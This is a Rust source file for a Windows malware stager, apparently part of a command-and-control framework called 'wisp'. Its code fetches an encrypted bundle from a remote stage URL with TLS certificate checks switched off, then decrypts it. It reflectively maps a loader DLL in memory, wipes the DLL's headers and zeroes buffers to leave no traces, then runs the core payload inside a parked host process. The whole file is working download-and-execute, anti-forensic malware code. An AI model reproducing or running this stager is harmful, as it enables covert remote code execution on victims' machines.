// wisp-stager: the only artifact that touches disk in the layered Rust
// payload. It GETs the stage URL from its own sentinel slot, decrypts the
// bundle (AES-256-GCM keyed by the one-time token), maps the fetched loader
// DLL in memory and hands it the core artifact + token. Nothing else is ever
// written to disk; the process then parks as the core's host.
#![cfg_attr(windows, windows_subsystem = "windows")]

#[cfg(windows)]
mod slot;

#[cfg(windows)]
fn main() {
    let Some(url) = slot::stage_url() else {
        eprintln!("stager: no stage URL in sentinel slot");
        std::process::exit(1);
    };
    let token = url.rsplit('/').next().unwrap_or("").to_string();
    if token.is_empty() {
        eprintln!("stager: stage URL has no token");
        std::process::exit(1);
    }

    let mut bundle = match fetch_bundle(&url, &token) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("stager: {e}");
            std::process::exit(1);
        }
    };

    let (loader_len, core_art_range) = match wisp_staged::split_bundle(&bundle) {
        Ok(b) => (b.loader.len(), b.core_art.as_ptr_range()),
        Err(e) => {
            eprintln!("stager: {e}");
            std::process::exit(1);
        }
    };

    let mut loader_buf = bundle[4..4 + loader_len].to_vec();
    if let Err(e) = wisp_staged::crypt_sections(&mut loader_buf, &wisp_staged::loader_key(&token))
    {
        eprintln!("stager: loader decrypt: {e}");
        std::process::exit(1);
    }
    let loader = match wisp_map::map_image(&loader_buf) {
        Ok(i) => i,
        Err(e) => {
            eprintln!("stager: loader map: {e}");
            std::process::exit(1);
        }
    };
    let _ = wisp_map::call_entry(&loader);
    wisp_map::tls_notify(&loader, 1 /* DLL_PROCESS_ATTACH */);
    let load_ptr = match wisp_map::resolve_export(&loader, "run_image") {
        Ok(p) => p,
        Err(e) => {
            eprintln!("stager: {e}");
            std::process::exit(1);
        }
    };
    wisp_map::wipe_headers(&loader);
    for b in loader_buf.iter_mut() {
        *b = 0;
    }

    let load: extern "system" fn(*mut u8, usize, *const u8, usize) -> i32 =
        unsafe { std::mem::transmute(load_ptr) };
    let core_ptr = core_art_range.start as *mut u8;
    let core_len = core_art_range.end as usize - core_ptr as usize;
    eprintln!("stager: bundle {core_len} bytes, handing to loader");
    let rc = load(core_ptr, core_len, token.as_ptr(), token.len());
    for b in bundle.iter_mut() {
        *b = 0;
    }
    if rc != 0 {
        eprintln!("stager: loader returned {rc}");
        std::process::exit(rc);
    }
    eprintln!("stager: core running, parking host process");
    loop {
        std::thread::park();
    }
}

#[cfg(not(windows))]
fn main() {
    eprintln!("wisp-stager is a Windows artifact");
    std::process::exit(1);
}

// fetch_bundle GETs the stage endpoint (JSON + AES-256-GCM, key = the
// token-derived stage key) with a few retries; the token was consumed once the
// server answers, so only transport failures are retried.
#[cfg(windows)]
fn fetch_bundle(url: &str, token: &str) -> Result<Vec<u8>, String> {
    use aes_gcm::aead::{Aead, KeyInit};
    use aes_gcm::{Aes256Gcm, Nonce};
    use base64::Engine;
    use std::io::Read;

    // The bundle is authenticated by AES-GCM under the token-derived key, so
    // certificate validation adds no integrity here. HTTPS listeners use the
    // console's self-signed cert, matching the direct agent's Insecure mode.
    let tls = native_tls::TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .map_err(|e| format!("tls init: {e}"))?;
    let agent = ureq::AgentBuilder::new()
        .timeout(std::time::Duration::from_secs(60))
        .tls_connector(std::sync::Arc::new(tls))
        .build();
    let mut last = String::from("no attempt made");
    for attempt in 0..3 {
        if attempt > 0 {
            std::thread::sleep(std::time::Duration::from_secs(3));
        }
        let body = match agent.get(url).call() {
            Ok(r) => {
                let mut out = Vec::new();
                r.into_reader()
                    .take(128 << 20)
                    .read_to_end(&mut out)
                    .map_err(|e| format!("stage read: {e}"))?;
                out
            }
            Err(ureq::Error::Status(404, _)) => return Err("stage token rejected (404)".into()),
            Err(e) => {
                last = format!("stage fetch: {e}");
                continue;
            }
        };
        let v: serde_json::Value =
            serde_json::from_slice(&body).map_err(|e| format!("bad stage response: {e}"))?;
        let iv = base64::engine::general_purpose::STANDARD
            .decode(v.get("iv").and_then(|x| x.as_str()).unwrap_or(""))
            .map_err(|e| format!("bad stage iv: {e}"))?;
        let ct = base64::engine::general_purpose::STANDARD
            .decode(v.get("ct").and_then(|x| x.as_str()).unwrap_or(""))
            .map_err(|e| format!("bad stage ct: {e}"))?;
        if iv.len() != 12 {
            return Err("bad stage iv length".into());
        }
        let key = wisp_staged::stage_key(token);
        let cipher = Aes256Gcm::new_from_slice(&key).map_err(|e| e.to_string())?;
        return cipher
            .decrypt(Nonce::from_slice(&iv), ct.as_ref())
            .map_err(|_| "stage decrypt failed (token replayed/expired?)".into());
    }
    Err(last)
}